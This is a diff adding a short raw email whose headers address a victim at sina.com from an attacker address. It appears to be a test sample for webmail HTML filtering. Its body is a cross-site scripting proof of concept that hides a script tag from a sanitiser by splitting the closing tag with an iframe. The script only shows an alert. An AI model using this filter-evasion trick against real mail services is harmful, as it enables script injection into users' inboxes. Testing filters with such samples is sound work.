@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: test
+To: victim@sina.com
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaaaaaaa<script defer="defer">alert(/xss by cc/);</sc<iframe>ript>
